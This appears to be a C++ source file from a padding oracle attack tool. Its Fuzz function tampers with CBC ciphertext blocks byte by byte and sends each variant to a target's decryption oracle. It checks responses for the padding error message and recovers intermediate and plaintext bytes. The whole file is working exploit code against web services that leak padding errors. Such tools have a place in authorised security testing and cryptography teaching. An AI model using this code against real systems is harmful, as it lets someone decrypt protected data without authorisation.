#include <curl/curl.h>
#include <functional>
#include <stdexcept> 
#include <string>
#include <mutex>

#include "include/network.h"
#include "include/cracker.h"
#include "include/target.h"
#include "include/common.h"
#include "include/utils.h"
#include "include/log.h"


bool PaddingError(std::string& response) {
    return response.find(Target::getErrMsg()) != std::string::npos;
}

void Guess(
    const std::string& hexC, 
    const unsigned int& X, 
    const unsigned int& pad,
    CypherData& cypherData
) {
/*
    we have x^d = pad (valid padding)
    hence d = pad^x
    and we have c^d = plain
*/
    if (Target::getBlockSize() < pad || pad == 0) {
        throw std::out_of_range("Padding value error in Guess");
    } 
    
    int C = HexToInt(hexC);
    int D = pad ^ X;

    cypherData.Pn[Target::getBlockSize()-pad] = C ^ D;
    cypherData.Dn[Target::getBlockSize()-pad] = D;
}


CypherData Fuzz(
    std::function<std::string(std::string&)> request, 
    std::vector<std::string>& blocks, 
    unsigned int k
) {

    CypherData cypherData;
    cypherData.Dn.assign(Target::getBlockSize(), 0);
    cypherData.Pn.assign(Target::getBlockSize(), 0);

    const unsigned int size = 2*Target::getBlockSize();
    const unsigned int nBlocks = k+2;
    unsigned int padStep = 1;
    bool padError = true;
    unsigned int j;
    unsigned int p;
    unsigned int validPadding;
    std::string currentVal;
    currentVal.reserve(2);

    std::string& block = blocks[k];
    std::string newCypher;
    std::string response;

    Log::info("Fuzzing block n°" + std::to_string(k+1) + "\n");
    try {
        // For every hex byte, in reverse
        for (j=size-1; j>0 && j<size; j-=2) {
            currentVal = GetVal(block, j);
            std::string blockCopy(block);

            // if padding is at least 0x02
            for (p=0; p<padStep-1; p++) {
                // modify d to generate a valid padding
                validPadding = cypherData.Dn[Target::getBlockSize()-p-1] ^ padStep;
                                
                // modify the block with validPadding
                unsigned int valInd = size-2*p-1;
                std::string validPaddingStr = IntToHex(validPadding);
                ModifyBlock(blockCopy, validPaddingStr, valInd);
            }

            // Testing each hex value.
            unsigned int val;
            std::string hexVal;
            hexVal.reserve(2);

            for (val = 0; val < 256; val++) {
                hexVal = IntToHex(val);

                std::string newBlock(blockCopy);
                ModifyBlock(newBlock, hexVal, j);
                newCypher = BlocksToCypher(blocks, nBlocks, newBlock, k, size);
                
                // Senb this new cyphertext to the oracle
                try {
                    response = request(newCypher);
                } catch(const std::exception& e) {
                    throw std::runtime_error("Error while making a GET request: " + std::string(e.what()));
                }

                // Check if the page contains the padding error text info
                padError = PaddingError(response);
                response.clear();
                if (!padError) {
                    Guess(currentVal, val, padStep, cypherData);
                    std::string strIndex = std::to_string(Target::getBlockSize()-padStep+1);
                    Log::info(
                        "[BLOCK-" + std::to_string(k) 
                        + "]-Found: D[" + strIndex
                        + "]=0x" + IntToHex(cypherData.Dn[Target::getBlockSize()-padStep])
                        + " | P["+ strIndex
                        + "]=0x" + IntToHex(cypherData.Pn[Target::getBlockSize()-padStep])
                    );
                    break;
                }
            }
            if (padError) Log::warning("No recovered data for byte " + std::to_string(Target::getBlockSize()-padStep+1));
            padError = true;
            padStep++;
        }

        return cypherData;

    } catch (const std::exception& e) {
        throw std::runtime_error("Error while fuzzing: " + std::string(e.what()));
    }
}
